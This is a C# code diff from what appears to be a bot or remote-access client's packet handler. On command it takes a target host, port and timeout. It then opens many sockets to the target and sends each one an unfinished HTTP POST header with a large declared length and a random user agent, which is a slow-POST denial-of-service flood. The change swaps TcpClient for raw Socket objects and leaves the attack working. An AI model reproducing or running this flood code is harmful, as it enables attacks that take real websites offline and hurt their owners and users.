@@ -30,7 +30,7 @@ namespace Client.Handle_Packet
             host = new Uri(unpack_msgpack.ForcePathObject("Host").AsString).DnsSafeHost;
             port = Convert.ToInt32(unpack_msgpack.ForcePathObject("port").AsString);
             timeout = Convert.ToInt32(unpack_msgpack.ForcePathObject("timeout").AsString) * 60;
-            List<TcpClient> listOfClients = new List<TcpClient>();
+            List<Socket> SocketList = new List<Socket>();
             TimeSpan timespan = TimeSpan.FromSeconds(timeout);
             Stopwatch stopwatch = new Stopwatch();
             stopwatch.Start();
@@ -42,11 +42,12 @@ namespace Client.Handle_Packet
                 {
                     try
                     {
-                        TcpClient tcp = new TcpClient(host.ToString(), port);
-                        listOfClients.Add(tcp);
+                        Socket tcp = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
+                        tcp.Connect(host.ToString(), port);
+                        SocketList.Add(tcp);
                         string post = $"POST / HTTP/1.1\r\nHost: {host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
                         byte[] buffer = Encoding.UTF8.GetBytes(post);
-                        tcp.Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                        tcp.Send(buffer, 0, buffer.Length, SocketFlags.None);
                     }
                     catch
                     {
@@ -57,9 +58,9 @@ namespace Client.Handle_Packet
             }
 
             Thread.Sleep(1000);
-            foreach (TcpClient tcp in listOfClients.ToList())
+            foreach (Socket tcp in SocketList.ToList())
             {
-                    tcp?.Client.Dispose();
+                    tcp?.Dispose();
             }
 
         }
